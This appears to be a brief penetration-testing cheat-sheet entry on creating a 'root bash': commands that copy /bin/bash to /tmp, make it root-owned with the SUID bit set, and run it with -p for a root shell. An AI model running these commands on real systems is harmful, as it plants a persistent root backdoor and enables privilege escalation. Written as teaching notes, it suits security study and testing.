# Root Bash

<div class="row row-cols-lg-2"><div>

A root bash is a (bash) shell that was executed as root. For instance, using an attack vector such as a SUID script, we may run:

```ps
$ cp /bin/bash /tmp/rootbash
$ chown root /tmp/rootbash
$ chmod +s /tmp/rootbash
```

If you are successful, you can use `-p` (and `-i`) to run it:

```ps
$ /tmp/rootbash -p
root@xxx$
```

ðŸ“š Replace `root` with another user according to the attack vector.
